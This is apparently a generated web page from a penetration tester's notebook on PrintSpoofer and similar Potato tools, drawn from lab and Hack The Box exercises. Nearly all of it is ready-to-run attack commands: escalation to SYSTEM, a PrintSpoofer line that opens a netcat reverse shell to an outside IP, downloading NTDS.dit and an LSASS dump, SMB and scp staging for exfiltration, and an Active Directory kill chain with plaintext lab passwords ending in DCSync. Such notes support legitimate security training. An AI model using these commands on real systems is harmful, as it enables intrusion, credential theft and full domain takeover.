---
title: "PrintSpoofer"
sidebarTitle: "PrintSpoofer"
description: "Commands and examples collected from your PrintSpoofer notes."
keywords: ["PrintSpoofer", "PrintSpoofer64.exe"]
boost: 10
hideFooterPagination: true
---

{/* Generated from Commands/printspoofer.md. Edit the Markdown source, then run scripts/sync_site.py. */}

[Search this tool’s saved examples](/commands/notebook?tool=printspoofer) · [All tools](/index)

## B. Abuse SeImpersonatePrivilege → SYSTEM (no UAC needed) — the clean HTB move

**Notebook example**

```cmd
.\PrintSpoofer64.exe -i -c cmd.exe
:: or, very reliable on Server 2019:
.\GodPotato-NET4.exe -cmd "cmd /c whoami"     :: -> nt authority\system
```

Saved as written; may include lab values or terminal output.

[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)

## Notebook recipes

5 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.

<AccordionGroup>

<Accordion title="11. File transfer over a pivot">

### 11. File transfer over a pivot

**Active Directory Attack Path: Worked Lab**

```text
*Evil-WinRM* PS> download C:\NTDS\NTDS.dit /home/kali/loot/ntds.dit    # built into evil-winrm
*Evil-WinRM* PS> upload /home/kali/tools/PrintSpoofer64.exe            # the reverse
```

</Accordion>

<Accordion title="🗺️ The kill chain (this assessment)">

### 🗺️ The kill chain (this assessment)

**Active Directory Attack Path: Worked Lab**

```text
OSINT (Betty Jayde)
   ↓  namebuster  → username list
Password spraying (Hydra, SSH)
   ↓  jbetty : Texas123!@#
SSH foothold (DMZ01)
   ↓  chisel / ligolo pivot into 172.16.119.0/24
Credential discovery (.bash_history)
   ↓  hwilliam : dealer-screwed-gym1
SMB share looting (FILE01)
   ↓  Employee-Passwords_OLD.psafe3
Crack the vault (pwsafe2john + john)
   ↓  bdavid, stom (OLD), hwilliam
BloodHound → bdavid = local admin on JUMP01 ; stom ∈ Domain Admins
   ↓
RDP to JUMP01 as bdavid (local admin)
   ↓  SeImpersonate → SYSTEM  (PrintSpoofer / GodPotato)
Mimikatz → LSASS → stom's CURRENT password
   ↓  stom : calves-warp-learning1  (Domain Admin)
DCSync against DC01
   ↓  Administrator NTLM + krbtgt
FULL DOMAIN COMPROMISE
```

</Accordion>

<Accordion title="Pulling files FROM the target to Kali (the hard direction)">

### Pulling files FROM the target to Kali (the hard direction)

**Pivoting and File Transfer: Field Reference**

```bash
# 1) evil-winrm has it built in (pulls over your existing session):
*Evil-WinRM* PS> download C:\Temp\lsass.dmp /home/kali/loot/lsass.dmp
*Evil-WinRM* PS> upload /home/kali/tools/PrintSpoofer64.exe   # the reverse

# 2) Stage through the DMZ (a host the internal box CAN reach):
#    run smbserver on DMZ01, push from internal host, then SSH-pull DMZ->Kali
impacket-smbserver share /tmp -smb2support -username u -password p     # ON DMZ01
#    on the internal host:
net use \\172.16.119.13\share /user:u p
copy C:\Temp\loot.zip \\172.16.119.13\share\
#    DMZ -> Kali:
scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/

# 3) Reverse forward (ligolo listener_add or chisel/ssh -R), then smbserver/nc ON Kali
#    becomes reachable from inside, push to it normally.

# 4) base64 paste (small files / when nothing else works):
#    Windows:  [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\x")) | clip
#    Kali:     echo '<paste>' | base64 -d > x
```

</Accordion>

<Accordion title="A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)">

### A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)

**Windows Post-Exploitation: Field Reference**

```cmd
:: PrintSpoofer (uses the print spooler / RPC)
.\PrintSpoofer64.exe -i -c cmd.exe
:: GodPotato (DCOM; very reliable on Server 2016–2022) — pick the .NET version present
.\GodPotato-NET4.exe -cmd "cmd /c whoami"           :: -> nt authority\system
:: alternatives if those are blocked:
.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"
.\RoguePotato.exe -r <KALI_IP> -e "cmd.exe" -l 9999
.\EfsPotato.exe "cmd /c whoami"
```

</Accordion>

<Accordion title="PrintSpoofer (Printer Bug)">

### PrintSpoofer (Printer Bug)

**Windows Privilege Escalation: Full Checklist**

```powershell
# run nc -lnvp 443 then :
.\PrintSpoofer64.exe -c "C:\Temp\nc64.exe 192.168.45.171 443 -e cmd"
# without listener
.\PrintSpoofer64.exe -i -c cmd
# Via RPD
.\PrintSpoofer64.exe -d 3 -c "powershell -ep bypass"
```

</Accordion>

</AccordionGroup>
